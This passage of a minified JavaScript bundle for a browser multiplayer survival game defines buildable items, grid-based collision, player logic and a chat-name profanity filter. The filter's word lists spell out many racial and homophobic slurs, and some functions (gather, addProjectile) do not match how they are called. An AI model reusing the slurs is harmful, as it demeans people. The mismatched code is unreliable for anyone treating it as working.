                            ignoreCollision: !0,
                            healCol: 15,
                            health: 400,
                            colDiv: .7,
                            scale: 45,
                            holdOffset: 20,
                            placeOffset: -5
                        }, {
                            age: 9,
                            group: e.exports.groups[10],
                            name: "spawn pad",
                            desc: "you will spawn here when you die but it will dissapear",
                            req: ["wood", 100, "stone", 100],
                            health: 400,
                            ignoreCollision: !0,
                            spawnPoint: !0,
                            scale: 45,
                            holdOffset: 20,
                            placeOffset: -5
                        }, {
                            age: 7,
                            group: e.exports.groups[12],
                            name: "blocker",
                            desc: "blocks building in radius",
                            req: ["wood", 30, "stone", 25],
                            ignoreCollision: !0,
                            blocker: 300,
                            health: 400,
                            colDiv: .7,
                            scale: 45,
                            holdOffset: 20,
                            placeOffset: -5
                        }, {
                            age: 7,
                            group: e.exports.groups[13],
                            name: "teleporter",
                            desc: "teleports you to a random point on the map",
                            req: ["wood", 60, "stone", 60],
                            ignoreCollision: !0,
                            teleport: !0,
                            health: 200,
                            colDiv: .7,
                            scale: 45,
                            holdOffset: 20,
                            placeOffset: -5
                        }],
                        e.exports.hitPlayers = [], e.exports.projFounds = [], e.exports.ticks = 0;
                    for (var n = 0; n < e.exports.list.length; ++n) e.exports.list[n].id = n, e.exports.list[n].pre && (e.exports.list[n].pre = n - e.exports.list[n].pre)
                    function removePre(list) {
                        list.forEach((e) => {
                            e.pre && delete e.pre;
                        });
                        return list;
                    }
                    e.exports.weapons = removePre (e.exports.weapons);
                    e.exports.list = removePre (e.exports.list);
                }, function(e, t) {
                    e.exports = {}
                }, function(e, t) {
                    var n = Math.floor,
                        i = Math.abs,
                        r = Math.cos,
                        s = Math.sin,
                        a = (Math.pow, Math.sqrt);
                    e.exports = function(e, t, o, c, l, h) {
                        var u, f;
                        this.objects = t, this.grids = {}, this.updateObjects = [];
                        var d = c.mapScale / c.colGrid;
                        this.setObjectGrids = function(e) {
                            for (var t = Math.min(c.mapScale, Math.max(0, e.x)), n = Math.min(c.mapScale, Math.max(0, e.y)), i = 0; i < c.colGrid; ++i) {
                                u = i * d;
                                for (var r = 0; r < c.colGrid; ++r) f = r * d, t + e.scale >= u && t - e.scale <= u + d && n + e.scale >= f && n - e.scale <= f + d && (this.grids[i + "_" + r] || (this.grids[i + "_" + r] = []), this.grids[i + "_" + r].push(e), e.gridLocations.push(i + "_" + r))
                            }
                        }, this.removeObjGrid = function(e) {
                            for (var t, n = 0; n < e.gridLocations.length; ++n)(t = this.grids[e.gridLocations[n]].indexOf(e)) >= 0 && this.grids[e.gridLocations[n]].splice(t, 1)
                        }, this.disableObj = function(e) {
                            if (e.active = !1,e.desDate = Date.now(), h) {
                                e.owner && e.pps && (e.owner.pps -= e.pps), this.removeObjGrid(e);
                                var t = this.updateObjects.indexOf(e);
                                t >= 0 && this.updateObjects.splice(t, 1)
                            }
                        }, this.hitObj = function(e, t) {
                            for (var n = 0; n < l.length; ++n) l[n].active && (e.sentTo[l[n].id] && (e.active ? l[n].canSee(e) && h.send(l[n].id, "8", o.fixTo(t, 1), e.sid) : h.send(l[n].id, "12", e.sid)), e.active || e.owner != l[n] || l[n].changeItemCount(e.group.id, -1))
                        };
                        var p, g, m = [];
                        this.getGridArrays = function(e, t, i) {
                            u = n(e / d), f = n(t / d), m.length = 0;
                            try {
                                this.grids[u + "_" + f] && m.push(this.grids[u + "_" + f]), e + i >= (u + 1) * d && ((p = this.grids[u + 1 + "_" + f]) && m.push(p), f && t - i <= f * d ? (p = this.grids[u + 1 + "_" + (f - 1)]) && m.push(p) : t + i >= (f + 1) * d && (p = this.grids[u + 1 + "_" + (f + 1)]) && m.push(p)), u && e - i <= u * d && ((p = this.grids[u - 1 + "_" + f]) && m.push(p), f && t - i <= f * d ? (p = this.grids[u - 1 + "_" + (f - 1)]) && m.push(p) : t + i >= (f + 1) * d && (p = this.grids[u - 1 + "_" + (f + 1)]) && m.push(p)), t + i >= (f + 1) * d && (p = this.grids[u + "_" + (f + 1)]) && m.push(p), f && t - i <= f * d && (p = this.grids[u + "_" + (f - 1)]) && m.push(p)
                            } catch (e) {}
                            return m
                        }, this.add = function(n, i, r, s, a, o, c, l, u) {
                            g = null;
                            for (var f = 0; f < t.length; ++f)
                                if (t[f].sid == n) {
                                    g = t[f];
                                    break
                                } if (!g)
                                    for (f = 0; f < t.length; ++f)
                                        if (!t[f].active) {
                                            g = t[f];
                                            break
                                        } g || (g = new e(n), t.push(g)), l && (g.sid = n), g.init(i, r, s, a, o, c, u), h && (this.setObjectGrids(g), g.doUpdate && this.updateObjects.push(g))
                        }, this.disableBySid = function(e) {
                            for (var n = 0; n < t.length; ++n)
                                if (t[n].sid == e) {
                                    this.disableObj(t[n]);
                                    break
                                }
                        }, this.removeAllItems = function(e, n) {
                            for (var i = 0; i < t.length; ++i) t[i].active && t[i].owner && t[i].owner.sid == e && this.disableObj(t[i]);
                            n && n.broadcast("13", e)
                        }, this.fetchSpawnObj = function(e) {
                            for (var n = null, i = 0; i < t.length; ++i)
                                if ((g = t[i]).active && g.owner && g.owner.sid == e && g.spawnPoint) {
                                    n = [g.x, g.y], this.disableObj(g), h.broadcast("12", g.sid), g.owner && g.owner.changeItemCount(g.group.id, -1);
                                    break
                                } return n
                        }, this.checkItemLocation = function(e, n, i, r, s, a, l) {
                            for (var h = 0; h < t.length; ++h) {
                                var u = t[h].blocker ? t[h].blocker : t[h].getScale(r, t[h].isItem);
                                if (t[h].active && o.getDistance(e, n, t[h].x, t[h].y) < i + u) return !1
                            }
                            return !(!a && 18 != s && n >= c.mapScale / 2 - c.riverWidth / 2 && n <= c.mapScale / 2 + c.riverWidth / 2)
                        }, this.addProjectile = function(e, t, n, i, r) {
                            for (var s, a = items.projectiles[r], c = 0; c < projectiles.length; ++c)
                                if (!projectiles[c].active) {
                                    s = projectiles[c];
                                    break
                                } s || (s = new Projectile(l, o), projectiles.push(s)), s.init(r, e, t, n, a.speed, i, a.scale)
                        }, this.checkCollision = function(e, t, n) {
                            n = n || 1;
                            var l = e.x - t.x,
                                h = e.y - t.y,
                                u = e.scale + t.scale;
                            if (i(l) <= u || i(h) <= u) {
                                u = e.scale + (t.getScale ? t.getScale() : t.scale);
                                var f = a(l * l + h * h) - u;
                                if (f <= 0) {
                                    if (t.ignoreCollision) !t.trap || e.noTrap || t.owner == e || t.owner && t.owner.team && t.owner.team == e.team ? t.boostSpeed ? (e.xVel += n * t.boostSpeed * (t.weightM || 1) * r(t.dir), e.yVel += n * t.boostSpeed * (t.weightM || 1) * s(t.dir)) : t.healCol ? e.healCol = t.healCol : t.teleport && (e.x = o.randInt(0, c.mapScale), e.y = o.randInt(0, c.mapScale)) : (e.lockMove = !0, e.trapAng = Math.atan2(e.y2 - t.y, e.x2 - t.x), t.hideFromEnemy = !1);
                                    else {
                                        var d = o.getDirection(e.x, e.y, t.x, t.y);
                                        if (o.getDistance(e.x, e.y, t.x, t.y), t.isPlayer ? (f = -1 * f / 2, e.x += f * r(d), e.y += f * s(d), t.x -= f * r(d), t.y -= f * s(d)) : (e.x = t.x + u * r(d), e.y = t.y + u * s(d), e.xVel *= .75, e.yVel *= .75), t.dmg && t.owner != e && (!t.owner || !t.owner.team || t.owner.team != e.team)) {
                                            e.changeHealth(-t.dmg, t.owner, t);
                                            var p = 1.5 * (t.weightM || 1);
                                            e.xVel += p * r(d), e.yVel += p * s(d), !t.pDmg || e.skin && e.skin.poisonRes || (e.dmgOverTime.dmg = t.pDmg, e.dmgOverTime.time = 5, e.dmgOverTime.doer = t.owner), e.colDmg && t.health && (t.changeHealth(-e.colDmg) && this.disableObj(t), this.hitObj(t, o.getDirection(e.x, e.y, t.x, t.y)))
                                        }
                                    }
                                    return t.zIndex > e.zIndex && (e.zIndex = t.zIndex), !0
                                }
                            }
                            return !1
                        }
                    }
                }, function(e, t, n) {
                    var i = new(n(49));
                    i.addWords("jew", "black", "baby", "child", "white", "porn", "pedo", "trump", "clinton", "hitler", "nazi", "gay", "pride", "sex", "pleasure", "touch", "poo", "kids", "rape", "white power", "nigga", "nig nog", "doggy", "rapist", "boner", "nigger", "nigg", "finger", "nogger", "nagger", "nig", "fag", "gai", "pole", "stripper", "penis", "vagina", "pussy", "nazi", "hitler", "stalin", "burn", "chamber", "cock", "peen", "dick", "spick", "nieger", "die", "satan", "n|ig", "nlg", "cunt", "c0ck", "fag", "lick", "condom", "anal", "shit", "phile", "little", "kids", "free KR", "tiny", "sidney", "ass", "kill", ".io", "(dot)", "[dot]", "mini", "whiore", "whore", "faggot", "github", "1337", "666", "satan", "senpa", "discord", "d1scord", "mistik", ".io", "senpa.io", "sidney", "sid", "senpaio", "vries", "asa");
                    var r = Math.abs,
                        s = Math.cos,
                        a = Math.sin,
                        o = Math.pow,
                        c = Math.sqrt;
                    e.exports = function(e, t, n, l, h, u, f, d, p, g, m, y, k, v) {
                        this.id = e, this.sid = t, this.tmpScore = 0, this.team = null, this.skinIndex = 0, this.tailIndex = 0, this.hitTime = 0, this.tails = {};
                        for (var w = 0; w < m.length; ++w) m[w].price <= 0 && (this.tails[m[w].id] = 1);
                        for (this.skins = {}, w = 0; w < g.length; ++w) g[w].price <= 0 && (this.skins[g[w].id] = 1);
                        this.points = 0, this.dt = 0, this.hidden = !1, this.itemCounts = {}, this.isPlayer = !0, this.pps = 0, this.moveDir = void 0, this.skinRot = 0, this.lastPing = 0, this.iconIndex = 0, this.skinColor = 0, this.reloads = [{count: Math.ceil(300 / 111), max: Math.ceil(300 / 111), id: 0, rarity: 0, done: true}, {count: Math.ceil(1500 / 111), max: Math.ceil(1500 / 111), id: 15, rarity: 0, done: true}, 23], this.spawn = function(e) {
                            this.active = !0, this.alive = !0, this.lockMove = !1, this.lockDir = !1, this.minimapCounter = 0, this.chatCountdown = 0, this.shameCount = 0, this.shameTimer = 0, this.sentTo = {}, this.gathering = 0, this.autoGather = 0, this.animTime = 0, this.animSpeed = 0, this.mouseState = 0, this.buildIndex = -1, this.weaponIndex = 0, this.dmgOverTime = {}, this.noMovTimer = 0, this.maxXP = 300, this.XP = 0, this.age = 1, this.kills = 0, this.upgrAge = 2, this.upgradePoints = 0, this.x = 0, this.y = 0, this.zIndex = 0, this.xVel = 0, this.yVel = 0, this.slowMult = 1, this.dir = 0, this.dirPlus = 0, this.targetDir = 0, this.targetAngle = 0, this.maxHealth = 100, this.health = this.maxHealth, this.scale = n.playerScale, this.speed = n.playerSpeed, this.resetMoveDir(), this.resetResources(e),
                                this.items = [0, 3, 6, 10], this.weapons = [0], this.shootCount = 0, this.weaponXP = [], this.reloads = [{count: Math.ceil(300 / 111), max: Math.ceil(300 / 111), id: 0, rarity: 0}, {count: Math.ceil(1500 / 111), max: Math.ceil(1500 / 111), id: 15, rarity: 0}, 23];
                        }, this.resetMoveDir = function() {
                            this.moveDir = void 0
                        }, this.resetResources = function(e) {
                            for (var t = 0; t < n.resourceTypes.length; ++t) this[n.resourceTypes[t]] = e ? 100 : 0
                        }, this.addItem = function(e) {
                            var t = p.list[e];
                            if (t) {
                                for (var n = 0; n < this.items.length; ++n)
                                    if (p.list[this.items[n]].group == t.group) return this.buildIndex == this.items[n] && (this.buildIndex = e), this.items[n] = e, !0;
                                return this.items.push(e), !0
                            }
                            return !1
                        }, this.setUserData = function(e) {
                            if (e) {
                                this.name = "unknown";
                                var t = e.name + "",
                                    r = !1,
                                    s = (t = (t = (t = (t = t.slice(0, n.maxNameLength)).replace(/[^\w:\(\)\/? -]+/gim, " ")).replace(/[^\x00-\x7F]/g, " ")).trim()).toLowerCase().replace(/\s/g, "").replace(/1/g, "i").replace(/0/g, "o").replace(/5/g, "s");
                                for (var a of i.list)
                                    if (-1 != s.indexOf(a)) {
                                        r = !0;
                                        break
                                    } t.length > 0 && !r && (this.name = t), this.skinColor = 0, n.skinColors[e.skin] && (this.skinColor = e.skin)
                            }
                        }, this.getData = function() {
                            return [this.id, this.sid, this.name, l.fixTo(this.x, 2), l.fixTo(this.y, 2), l.fixTo(this.dir, 3), this.health, this.maxHealth, this.scale, this.skinColor]
                        }, this.setData = function(e) {
                            this.id = e[0], this.sid = e[1], this.name = e[2], this.x = e[3], this.y = e[4], this.dir = e[5], this.health = e[6], this.maxHealth = e[7], this.scale = e[8], this.skinColor = e[9];
                            this.primary = null, this.secondary = null, this.primaryReload = 1, this.secondaryReload = 1, this.clownCounter = 0, this.turretReload = 1;
                        };
                        var b = 0;
                        this.update = function(e) {
                            if (this.alive) {
                                if (this.shameTimer > 0 && (this.shameTimer -= e, this.shameTimer <= 0 && (this.shameTimer = 0, this.shameCount = 0)), (b -= e) <= 0) {
                                    var t = (this.skin && this.skin.healthRegen ? this.skin.healthRegen : 0) + (this.tail && this.tail.healthRegen ? this.tail.healthRegen : 0);
                                    t && this.changeHealth(t, this), this.dmgOverTime.dmg && (this.changeHealth(-this.dmgOverTime.dmg, this.dmgOverTime.doer), this.dmgOverTime.time -= 1, this.dmgOverTime.time <= 0 && (this.dmgOverTime.dmg = 0)), this.healCol && this.changeHealth(this.healCol, this), b = 1e3
                                }
                                if (this.alive) {
                                    if (this.slowMult < 1 && (this.slowMult += 8e-4 * e, this.slowMult > 1 && (this.slowMult = 1)), this.noMovTimer += e, (this.xVel || this.yVel) && (this.noMovTimer = 0), this.lockMove) this.xVel = 0, this.yVel = 0;
                                    else {
                                        var i = (this.buildIndex >= 0 ? .5 : 1) * (p.weapons[this.weaponIndex].spdMult || 1) * (this.skin && this.skin.spdMult || 1) * (this.tail && this.tail.spdMult || 1) * (this.y <= n.snowBiomeTop ? this.skin && this.skin.coldM ? 1 : n.snowSpeed : 1) * this.slowMult;
                                        !this.zIndex && this.y >= n.mapScale / 2 - n.riverWidth / 2 && this.y <= n.mapScale / 2 + n.riverWidth / 2 && (this.skin && this.skin.watrImm ? (i *= .75, this.xVel += .4 * n.waterCurrent * e) : (i *= .33, this.xVel += n.waterCurrent * e));
                                        var r = null != this.moveDir ? s(this.moveDir) : 0,
                                            d = null != this.moveDir ? a(this.moveDir) : 0,
                                            g = c(r * r + d * d);
                                        0 != g && (r /= g, d /= g), r && (this.xVel += r * this.speed * i * e), d && (this.yVel += d * this.speed * i * e)
                                    }
                                    var m;
                                    this.zIndex = 0, this.lockMove = !1, this.healCol = 0;
                                    for (var y = l.getDistance(0, 0, this.xVel * e, this.yVel * e), k = Math.min(4, Math.max(1, Math.round(y / 40))), v = 1 / k, w = 0; w < k; ++w) {
                                        this.xVel && (this.x += this.xVel * e * v), this.yVel && (this.y += this.yVel * e * v), m = u.getGridArrays(this.x, this.y, this.scale);
                                        for (var x = 0; x < m.length; ++x)
                                            for (var S = 0; S < m[x].length; ++S) m[x][S].active && u.checkCollision(this, m[x][S], v)
                                    }
                                    for (w = (I = f.indexOf(this)) + 1; w < f.length; ++w) f[w] != this && f[w].alive && u.checkCollision(this, f[w]);
                                    if (this.xVel && (this.xVel *= o(n.playerDecel, e), this.xVel <= .01 && this.xVel >= -.01 && (this.xVel = 0)), this.yVel && (this.yVel *= o(n.playerDecel, e), this.yVel <= .01 && this.yVel >= -.01 && (this.yVel = 0)), this.x - this.scale < 0 ? this.x = this.scale : this.x + this.scale > n.mapScale && (this.x = n.mapScale - this.scale), this.y - this.scale < 0 ? this.y = this.scale : this.y + this.scale > n.mapScale && (this.y = n.mapScale - this.scale), this.buildIndex < 0)
                                        if (this.reloads[this.weaponIndex] > 0) this.reloads[this.weaponIndex] -= e, this.gathering = this.mouseState;
                                        else if (this.gathering || this.autoGather) {
                                            var T = !0;
                                            if (null != p.weapons[this.weaponIndex].gather) this.gather(f);
                                            else if (null != p.weapons[this.weaponIndex].projectile && this.hasRes(p.weapons[this.weaponIndex], this.skin ? this.skin.projCost : 0)) {
                                                this.useRes(p.weapons[this.weaponIndex], this.skin ? this.skin.projCost : 0), this.noMovTimer = 0;
                                                var I = p.weapons[this.weaponIndex].projectile,
                                                    E = 2 * this.scale,
                                                    M = this.skin && this.skin.aMlt ? this.skin.aMlt : 1;
                                                p.weapons[this.weaponIndex].rec && (this.xVel -= p.weapons[this.weaponIndex].rec * s(this.dir), this.yVel -= p.weapons[this.weaponIndex].rec * a(this.dir)), h.addProjectile(this.x + E * s(this.dir), this.y + E * a(this.dir), this.dir, p.projectiles[I].range * M, p.projectiles[I].speed * M, I, this, null, this.zIndex)
                                            } else T = !1;
                                            this.gathering = this.mouseState, T && (this.reloads[this.weaponIndex] = p.weapons[this.weaponIndex].speed * (this.skin && this.skin.atkSpd || 1))
                                        }
                                }
                            }
                        }, this.onTick = function(e) {
                            let Reload = this.reloads[Number(this.weaponIndex > 8)];
                            let Weapon = p.weapons[this.weaponIndex];
                            if(Reload.id != Weapon.id) {
                                Reload.id = Weapon.id;
                                Reload.max = Weapon.speed ? (Math.ceil(Weapon.speed / 111)) : 0;
                                Reload.count = Reload.max;
                                Reload.done = true;
                                Reload.rarity = this.weaponVariant;
                            };
                            if(this.weaponVariant != Reload.rarity) Reload.rarity = this.weaponVariant;
                            if(Reload.count < Reload.max && this.buildIndex == -1){
                                Reload.count += 1;
                                Reload.done = Reload.count == Reload.max;
                            };
                            this.reloads[Number(this.weaponIndex > 8)] = Reload;
                            if(this.reloads[2] < 23) this.reloads[2]++;
                        }, this.addWeaponXP = function(e) {
                            this.weaponXP[this.weaponIndex] || (this.weaponXP[this.weaponIndex] = 0), this.weaponXP[this.weaponIndex] += e
                        }, this.earnXP = function(e) {
                            this.age < n.maxAge && (this.XP += e, this.XP >= this.maxXP ? (this.age < n.maxAge ? (this.age++, this.XP = 0, this.maxXP *= 1.2) : this.XP = this.maxXP, this.upgradePoints++, y.send(this.id, "16", this.upgradePoints, this.upgrAge), y.send(this.id, "15", this.XP, l.fixTo(this.maxXP, 1), this.age)) : y.send(this.id, "15", this.XP))
                        }, this.changeHealth = function(e, t) {
                            if (e > 0 && this.health >= this.maxHealth) return !1;
                            e < 0 && this.skin && (e *= this.skin.dmgMult || 1), e < 0 && this.tail && (e *= this.tail.dmgMult || 1), e < 0 && (this.hitTime = Date.now()), this.health += e, this.health > this.maxHealth && (e -= this.health - this.maxHealth, this.health = this.maxHealth), this.health <= 0 && this.kill(t);
                            for (var n = 0; n < f.length; ++n) this.sentTo[f[n].id] && y.send(f[n].id, "h", this.sid, Math.round(this.health));
                            return !t || !t.canSee(this) || t == this && e < 0 || y.send(t.id, "t", Math.round(this.x), Math.round(this.y), Math.round(-e), 1), !0
                        }, this.kill = function(e) {
                            e && e.alive && (e.kills++, e.skin && e.skin.goldSteal ? k(e, Math.round(this.points / 2)) : k(e, Math.round(100 * this.age * (e.skin && e.skin.kScrM ? e.skin.kScrM : 1))), y.send(e.id, "9", "kills", e.kills, 1)), this.alive = !1, y.send(this.id, "11"), v()
                        }, this.addResource = function(e, t, i) {
                            !i && t > 0 && this.addWeaponXP(t), 3 == e ? k(this, t, !0) : (this[n.resourceTypes[e]] += t, y.send(this.id, "9", n.resourceTypes[e], this[n.resourceTypes[e]], 1))
                        }, this.changeItemCount = function(e, t) {
                            this.itemCounts[e] = this.itemCounts[e] || 0, this.itemCounts[e] += t, y.send(this.id, "14", e, this.itemCounts[e])
                        }, this.buildItem = function(e) {
                            var t = this.scale + e.scale + (e.placeOffset || 0),
                                n = this.x + t * s(this.dir),
                                i = this.y + t * a(this.dir);
                            if (this.canBuild(e) && !(e.consume && this.skin && this.skin.noEat) && (e.consume || u.checkItemLocation(n, i, e.scale, .6, e.id, !1, this))) {
                                var r = !1;
                                if (e.consume) {
                                    if (this.hitTime) {
                                        var o = Date.now() - this.hitTime;
                                        this.hitTime = 0, o <= 120 ? (this.shameCount++, this.shameCount >= 8 && (this.shameTimer = 3e4, this.shameCount = 0)) : (this.shameCount -= 2, this.shameCount <= 0 && (this.shameCount = 0))
                                    }
                                    this.shameTimer <= 0 && (r = e.consume(this))
                                } else r = !0, e.group.limit && this.changeItemCount(e.group.id, 1), e.pps && (this.pps += e.pps), u.add(u.objects.length, n, i, this.dir, e.scale, e.type, e, !1, this);
                                r && (this.useRes(e), this.buildIndex = -1)
                            }
                        }, this.hasRes = function(e, t) {
                            for (var n = 0; n < e.req.length;) {
                                if (this[e.req[n]] < Math.round(e.req[n + 1] * (t || 1))) return !1;
                                n += 2
                            }
                            return !0
                        }, this.useRes = function(e, t) {
                            if (!n.inSandbox)
                                for (var i = 0; i < e.req.length;) this.addResource(n.resourceTypes.indexOf(e.req[i]), -Math.round(e.req[i + 1] * (t || 1))), i += 2
                        }, this.canBuild = function(e) {
                            return !!n.inSandbox || !(e.group.limit && this.itemCounts[e.group.id] >= e.group.limit) && this.hasRes(e)
                        }, this.gather = function(oe, ot, on) {
                            this.reloads[ot].count = 0 + (window.pingTime > 70 ? 1 : 0);
                            this.reloads[ot].done = false;
                            this.noMovTimer = 0, this.slowMult -= on.hitSlow ||
                                .3, this.slowMult < 0 && (this.slowMult = 0);
                            for(var e, t, i, r = n.fetchVariant(this), o = r.poison, c = r.val, h = {},
                                g = u.getGridArrays(this.x, this.y, on.range),
                                m = 0; m < g.length; ++m)
                                for(var y = 0; y < g[m].length; ++y)
                                    if ((t = g[m][y]).active && !t.dontGather && !h[t.sid] && Date.now() - t.hitTime <= 100 && l.getDistance(this.x, this.y, t.x, t.y) - t.scale - 35 <= p.weapons[this.weaponIndex].range){
                                        e = l.getDirection(t.x, t.y, this.x, this.y);
                                        if(l.getAngleDist(e, this.d2) <= n.gatherAngle) {
                                            h[t.sid] = 1;
                                            if (t.health) {
                                                if (t.changeHealth(-on.dmg * c * (oe == 10 ? 7.5 : 1) * (this.skinIndex == 40 ? 3.3 : 1), this)) {
                                                    null;
                                                }
                                            }
                                        }
                                    }
                        }, this.sendAnimation = function(e) {
                            for (var t = 0; t < f.length; ++t) this.sentTo[f[t].id] && this.canSee(f[t]) && y.send(f[t].id, "7", this.sid, e ? 1 : 0, this.weaponIndex)
                        };
                        var x = 0,
                            S = 0;
                        this.animate = function(e) {
                            this.animTime > 0 && (this.animTime -= e, this.animTime <= 0 ? (this.animTime = 0, this.dirPlus = 0, x = 0, S = 0) : 0 == S ? (x += e / (this.animSpeed * n.hitReturnRatio), this.dirPlus = l.lerp(0, this.targetAngle, Math.min(1, x)), x >= 1 && (x = 1, S = 1)) : (x -= e / (this.animSpeed * (1 - n.hitReturnRatio)), this.dirPlus = l.lerp(0, this.targetAngle, Math.max(0, x))))
                        }, this.startAnim = function(e, t) {
                            this.animTime = this.animSpeed = p.weapons[t].speed, this.targetAngle = e ? -n.hitAngle : -Math.PI, x = 0, S = 0
                        }, this.canSee = function(e) {
                            if (!e) return !1;
                            if (e.skin && e.skin.invisTimer && e.noMovTimer >= e.skin.invisTimer) return !1;
                            var t = r(e.x - this.x) - e.scale,
                                i = r(e.y - this.y) - e.scale;
                            return t <= n.maxScreenWidth / 2 * 1.3 && i <= n.maxScreenHeight / 2 * 1.3
                        }
                    }
                }, function(e, t, n) {
                    const i = n(50).words,
                          r = n(51).array;
                    e.exports = class {
                        constructor(e = {}) {
                            Object.assign(this, {
                                list: e.emptyList && [] || Array.prototype.concat.apply(i, [r, e.list || []]),
                                exclude: e.exclude || [],
                                placeHolder: e.placeHolder || "*",
                                regex: e.regex || /[^a-zA-Z0-9|\$|\@]|\^/g,
                                replaceRegex: e.replaceRegex || /\w/g
                            })
                        }
                        isProfane(e) {
                            return this.list.filter(t => {
                                const n = new RegExp(`\\b${t.replace(/(\W)/g,"\\$1")}\\b`, "gi");
                                return !this.exclude.includes(t.toLowerCase()) && n.test(e)
                            }).length > 0 || !1
                        }
                        replaceWord(e) {
                            return e.replace(this.regex, "").replace(this.replaceRegex, this.placeHolder)
                        }
                        clean(e) {
                            return e.split(/\b/).map(e => this.isProfane(e) ? this.replaceWord(e) : e).join("")
                        }
                        addWords() {
                            let e = Array.from(arguments);
                            this.list.push(...e), e.map(e => e.toLowerCase()).forEach(e => {
                                this.exclude.includes(e) && this.exclude.splice(this.exclude.indexOf(e), 1)
                            })
                        }
                        removeWords() {
                            this.exclude.push(...Array.from(arguments).map(e => e.toLowerCase()))
                        }
                    }
                }, function(e) {
                    e.exports = {
                        words: ["ahole", "anus", "ash0le", "ash0les", "asholes", "ass", "Ass Monkey", "Assface", "assh0le", "assh0lez", "asshole", "assholes", "assholz", "asswipe", "azzhole", "bassterds", "bastard", "bastards", "bastardz", "basterds", "basterdz", "Biatch", "bitch", "bitches", "Blow Job", "boffing", "butthole", "buttwipe", "c0ck", "c0cks", "c0k", "Carpet Muncher", "cawk", "cawks", "Clit", "cnts", "cntz", "cock", "cockhead", "cock-head", "cocks", "CockSucker", "cock-sucker", "crap", "cum", "cunt", "cunts", "cuntz", "dick", "dild0", "dild0s", "dildo", "dildos", "dilld0", "dilld0s", "dominatricks", "dominatrics", "dominatrix", "dyke", "enema", "f u c k", "f u c k e r", "fag", "fag1t", "faget", "fagg1t", "faggit", "faggot", "fagg0t", "fagit", "fags", "fagz", "faig", "faigs", "fart", "flipping the bird", "fuck", "fucker", "fuckin", "fucking", "fucks", "Fudge Packer", "fuk", "Fukah", "Fuken", "fuker", "Fukin", "Fukk", "Fukkah", "Fukken", "Fukker", "Fukkin", "g00k", "God-damned", "h00r", "h0ar", "h0re", "hells", "hoar", "hoor", "hoore", "jackoff", "jap", "japs", "jerk-off", "jisim", "jiss", "jizm", "jizz", "knob", "knobs", "knobz", "kunt", "kunts", "kuntz", "Lezzian", "Lipshits", "Lipshitz", "masochist", "masokist", "massterbait", "masstrbait", "masstrbate", "masterbaiter", "masterbate", "masterbates", "Motha Fucker", "Motha Fuker", "Motha Fukkah", "Motha Fukker", "Mother Fucker", "Mother Fukah", "Mother Fuker", "Mother Fukkah", "Mother Fukker", "mother-fucker", "Mutha Fucker", "Mutha Fukah", "Mutha Fuker", "Mutha Fukkah", "Mutha Fukker", "n1gr", "nastt", "nigger;", "nigur;", "niiger;", "niigr;", "orafis", "orgasim;", "orgasm", "orgasum", "oriface", "orifice", "orifiss", "packi", "packie", "packy", "paki", "pakie", "paky", "pecker", "peeenus", "peeenusss", "peenus", "peinus", "pen1s", "penas", "penis", "penis-breath", "penus", "penuus", "Phuc", "Phuck", "Phuk", "Phuker", "Phukker", "polac", "polack", "polak", "Poonani", "pr1c", "pr1ck", "pr1k", "pusse", "pussee", "pussy", "puuke", "puuker", "queer", "queers", "queerz", "qweers", "qweerz", "qweir", "recktum", "rectum", "retard", "sadist", "scank", "schlong", "screwing", "semen", "sex", "sexy", "Sh!t", "sh1t", "sh1ter", "sh1ts", "sh1tter", "sh1tz", "shit", "shits", "shitter", "Shitty", "Shity", "shitz", "Shyt", "Shyte", "Shytty", "Shyty", "skanck", "skank", "skankee", "skankey", "skanks", "Skanky", "slag", "slut", "sluts", "Slutty", "slutz", "son-of-a-bitch", "tit", "turd", "va1jina", "vag1na", "vagiina", "vagina", "vaj1na", "vajina", "vullva", "vulva", "w0p", "wh00r", "wh0re", "whore", "xrated", "xxx", "b!+ch", "bitch", "blowjob", "clit", "arschloch", "fuck", "shit", "ass", "asshole", "b!tch", "b17ch", "b1tch", "bastard", "bi+ch", "boiolas", "buceta", "c0ck", "cawk", "chink", "cipa", "clits", "cock", "cum", "cunt", "dildo", "dirsa", "ejakulate", "fatass", "fcuk", "fuk", "fux0r", "hoer", "hore", "jism", "kawk", "l3itch", "l3i+ch", "lesbian", "masturbate", "masterbat*", "masterbat3", "motherfucker", "s.o.b.", "mofo", "nazi", "nigga", "nigger", "nutsack", "phuck", "pimpis", "pusse", "pussy", "scrotum", "sh!t", "shemale", "shi+", "sh!+", "slut", "smut", "teets", "tits", "boobs", "b00bs", "teez", "testical", "testicle", "titt", "w00se", "jackoff", "wank", "whoar", "whore", "*damn", "*dyke", "*fuck*", "*shit*", "@$$", "amcik", "andskota", "arse*", "assrammer", "ayir", "bi7ch", "bitch*", "bollock*", "breasts", "butt-pirate", "cabron", "cazzo", "chraa", "chuj", "Cock*", "cunt*", "d4mn", "daygo", "dego", "dick*", "dike*", "dupa", "dziwka", "ejackulate", "Ekrem*", "Ekto", "enculer", "faen", "fag*", "fanculo", "fanny", "feces", "feg", "Felcher", "ficken", "fitt*", "Flikker", "foreskin", "Fotze", "Fu(*", "fuk*", "futkretzn", "gook", "guiena", "h0r", "h4x0r", "hell", "helvete", "hoer*", "honkey", "Huevon", "hui", "injun", "jizz", "kanker*", "kike", "klootzak", "kraut", "knulle", "kuk", "kuksuger", "Kurac", "kurwa", "kusi*", "kyrpa*", "lesbo", "mamhoon", "masturbat*", "merd*", "mibun", "monkleigh", "mouliewop", "muie", "mulkku", "muschi", "nazis", "nepesaurio", "nigger*", "orospu", "paska*", "perse", "picka", "pierdol*", "pillu*", "pimmel", "piss*", "pizda", "poontsee", "poop", "porn", "p0rn", "pr0n", "preteen", "pula", "pule", "puta", "puto", "qahbeh", "queef*", "rautenberg", "schaffer", "scheiss*", "schlampe", "schmuck", "screw", "sh!t*", "sharmuta", "sharmute", "shipal", "shiz", "skribz", "skurwysyn", "sphencter", "spic", "spierdalaj", "splooge", "suka", "b00b*", "testicle*", "titt*", "twat", "vittu", "wank*", "wetback*", "wichser", "wop*", "yed", "zabourah"]
                    }
                }, function(e, t, n) {
                    e.exports = {
                        object: n(52),
                        array: n(53),
                        regex: n(54)
                    }
                }, function(e, t) {
                    e.exports = {
                        "4r5e": 1,
                        "5h1t": 1,
                        "5hit": 1,
                        a55: 1,
                        anal: 1,
                        anus: 1,
                        ar5e: 1,
                        arrse: 1,
                        arse: 1,
                        ass: 1,
                        "ass-fucker": 1,
                        asses: 1,
                        assfucker: 1,
                        assfukka: 1,
                        asshole: 1,
                        assholes: 1,
                        asswhole: 1,
                        a_s_s: 1,
                        "b!tch": 1,
                        b00bs: 1,
                        b17ch: 1,
                        b1tch: 1,
                        ballbag: 1,
